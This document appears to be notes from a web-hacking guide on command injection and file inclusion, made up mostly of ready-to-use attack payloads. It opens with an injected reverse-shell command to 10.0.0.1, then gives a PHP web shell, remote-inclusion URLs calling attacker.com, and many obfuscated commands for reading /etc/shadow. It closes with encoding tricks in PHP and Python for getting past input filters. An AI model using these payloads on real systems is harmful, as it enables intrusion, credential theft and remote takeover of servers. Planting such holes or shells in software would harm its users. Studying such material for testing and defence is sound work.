GET /download?url="google.com;bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"

Host: example.com

# File inclusion vulnerability has two subtypes: remote file inclusion and local file inclusion.

<?php
 // Some PHP code
 $file = $_GET["page"];
 include $file;
 // Some PHP code
?>

<?PHP
 system($_GET["cmd"]);
?>

# http://example.com/?page=http://attacker.com/malicious.php?cmd=ls

# PHP payloads
This command is designed to print the local PHP configuration information if execution succeeds:
phpinfo();
This command prints the result of the system command ls:
<?php system("ls");?>
This command delays the response for 10 seconds:
<?php system("sleep 10");?>

# Unix payloads
This command prints the result of the system command ls:
;ls;
These commands delay the response for 10 seconds:
| sleep 10;
& sleep 10;
` sleep 10;`
$(sleep 10)


http://example.com/?page=http://attacker.com/malicious.php

http://example.com/?page=http:attacker.com/malicious.php

http://example.com/?page=../uploads/malicious.php

http://example.com/?page=..%2fuploads%2fmalicious.php

cat /etc/shadow

cat "/e"tc'/shadow'

cat /etc/sh*dow

cat /etc/sha``dow

cat /etc/sha$()dow

cat /etc/sha${}dow

system('cat /etc/shadow');

The following example executes a system command by concatenating 
the strings sys and tem:
('sys'.'tem')('cat /etc/shadow');

The following example does the same thing but inserts a blank comment in the middle of the command:
system/**/('ls');

And this line of code is a hex-encoded version of the system command:
'\x73\x79\x73\x74\x65\x6d'('ls');

Similar behavior exists in Python. The following are all equivalent in 
Python syntax:
__import__('os').system('cat /etc/shadow')

__import__('o'+'s').system('cat /etc/shadow')

__import__('\x6f\x73').system('cat /etc/shadow')



GET /calculator?calc="__import__('os').sy"&calc="stem('ls')"

Host: example.com

You can hex-encode, URL-encode, double-URL-encode, and 
vary the cases (uppercase or lowercase characters) of your payloads. You 
can also try to insert special characters such as null bytes, newline characters, escape characters (\), and other special or non-ASCII characters into 
the payload.
